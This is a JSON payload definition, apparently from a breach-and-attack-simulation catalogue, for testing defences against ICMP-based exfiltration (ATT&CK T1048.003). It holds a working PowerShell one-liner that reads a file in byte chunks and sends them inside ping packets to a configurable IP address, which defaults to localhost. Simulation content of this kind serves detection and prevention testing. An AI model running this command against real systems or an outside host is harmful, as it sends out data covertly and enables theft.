@@ -1,0 +1,81 @@
+{
+  "export_version": 1,
+  "native_collection": true,
+  "payload_information": {
+    "payload_type": "Command",
+    "payload_name": "Exfiltration Over Alternative Protocol - ICMP",
+    "payload_description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_attack_patterns": [
+      {
+        "attack_pattern_id": "2510c51f-dfce-4b7f-b860-1b69ed4654b7",
+        "attack_pattern_name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+        "attack_pattern_description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
+        "attack_pattern_external_id": "T1048.003",
+        "attack_pattern_kill_chain_phases": null
+      }
+    ],
+    "payload_cleanup_executor": null,
+    "payload_cleanup_command": null,
+    "payload_elevation_required": false,
+    "payload_arguments": [
+      {
+        "type": "text",
+        "key": "input_file",
+        "default_value": "C:\\Windows\\System32\\notepad.exe",
+        "description": null,
+        "separator": null
+      },
+      {
+        "type": "text",
+        "key": "ip_address",
+        "default_value": "127.0.0.1",
+        "description": null,
+        "separator": null
+      }
+    ],
+    "payload_prerequisites": [],
+    "payload_external_id": "16e5f26d-e92f-4a2f-8894-abbf29087153",
+    "payload_source": "FILIGRAN",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_status": "VERIFIED",
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_detection_remediations": [],
+    "payload_tags": [],
+    "payload_output_parsers": [],
+    "payload_created_at": "2025-06-20T09:48:40.920388Z",
+    "payload_updated_at": "2025-07-30T05:22:43.528118Z",
+    "command_executor": "psh",
+    "command_content": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n",
+    "payload_domains": [
+      {
+        "domain_name": "Endpoint",
+        "domain_color": "#389CFF"
+      },
+      {
+        "domain_name": "Data Exfiltration",
+        "domain_color": "#9933CC"
+      },
+      {
+        "domain_name": "Network",
+        "domain_color": "#009933"
+      }
+    ]
+  },
+  "payload_tags": [],
+  "payload_attack_patterns": [
+    {
+      "attack_pattern_id": "2510c51f-dfce-4b7f-b860-1b69ed4654b7",
+      "attack_pattern_name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+      "attack_pattern_description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
+      "attack_pattern_external_id": "T1048.003",
+      "attack_pattern_kill_chain_phases": null
+    }
+  ],
+  "payload_arguments_documents": []
+}
